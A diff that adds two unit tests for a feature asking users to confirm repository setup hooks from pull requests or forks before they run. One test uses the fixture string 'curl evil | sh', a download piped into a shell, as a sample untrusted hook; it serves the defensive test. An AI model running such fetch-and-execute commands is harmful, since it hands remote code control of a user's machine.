@@ -103,4 +103,47 @@ describe('setup trust for a create, on its base (Pod)', () => {
     expect(await decision).toBe('skip')
     expect(onTrusted).not.toHaveBeenCalled()
   })
+
+  it('asks about a pull request’s head under repo-wide trust, without keeping the answer', async () => {
+    const { state, pending } = testState({ 'repo-1': { all: { approvedAt: 1 } } })
+    hooksCheckMock.mockResolvedValue(hooks('curl evil | sh'))
+    const onTrusted = vi.fn()
+    const decision = ensureHooksConfirmed(
+      state,
+      'repo-1',
+      'setup',
+      undefined,
+      undefined,
+      undefined,
+      { baseRef: 'a'.repeat(40), foreign: true, onTrusted }
+    )
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(pending[0].data).toMatchObject({ foreign: true, previouslyApproved: false })
+    pending[0].resolve('run')
+    expect(await decision).toBe('run')
+    expect(onTrusted).toHaveBeenCalledWith(await hashOrcaHookScript('curl evil | sh'))
+  })
+
+  it('asks about a base the host says isn’t the repo’s own branch, even with its hash recorded', async () => {
+    const hash = await hashOrcaHookScript('./setup.sh')
+    const { state, pending } = testState({
+      'repo-1': { setup: { contentHash: hash, approvedAt: 1 } }
+    })
+    hooksCheckMock.mockImplementation(async (args: { ref?: string }) =>
+      args.ref ? { ...hooks('./setup.sh'), baseOwned: false } : hooks('./setup.sh')
+    )
+    const decision = ensureHooksConfirmed(
+      state,
+      'repo-1',
+      'setup',
+      undefined,
+      undefined,
+      undefined,
+      { baseRef: 'fork/main', onTrusted: vi.fn() }
+    )
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(pending[0].data.foreign).toBe(true)
+    pending[0].resolve('skip')
+    expect(await decision).toBe('skip')
+  })
 })
